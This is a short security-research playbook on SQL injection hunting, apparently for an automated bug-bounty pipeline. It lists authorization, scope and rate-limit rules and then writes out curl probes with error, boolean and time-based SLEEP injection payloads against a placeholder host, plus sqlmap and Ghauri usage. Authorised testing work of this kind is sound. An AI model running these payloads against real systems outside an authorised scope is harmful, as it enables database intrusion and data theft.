# class-sqli — SQL Injection hunting

Research compiled 2026-07-03. Sources: HiveSecurity 2026 SQLi guide, sqlmap docs, PortSwigger SQLi, June 2026 Ghauri writeup, gasmask WAF bypass (2025).

**Pipeline role:** SQLi is an ACTIVE LANE. Confirm primitive: `'` vs `''` differential (error + boolean length change). Second stage: **sqlmap** (operator-authorized, in-scope+paying only) OR **Ghauri** when sqlmap is WAF-blocked. Hard lines: PoC-depth only (`--banner`/`--current-db`/`--current-user`/`--dbs`); NEVER mass `--dump` of third-party PII; rate-limited (`--delay 1 --threads 1`); SKIP "no automated scanners" programs. Results must go to operator — NEVER automated.

---

## The confirm primitive (pipeline-safe)

```bash
# Step 1: error trigger
curl -s "https://HOST/path?param='" | grep -i 'error\|sql\|syntax\|ORA-\|MySQL\|SQLSTATE'

# Step 2: boolean differential (TRUE vs FALSE)
TRUE:  curl -s "https://HOST/path?param=1' AND '1'='1"   # length L1
FALSE: curl -s "https://HOST/path?param=1' AND '1'='2"   # length L2
# |L1 - L2| > 0 AND L1 matches baseline → boolean injectable

# Step 3: time-based (blind, no error/content diff)
curl -s "https://HOST/path?param=1' AND SLEEP(5)--"      # response delayed ~5s → injectable
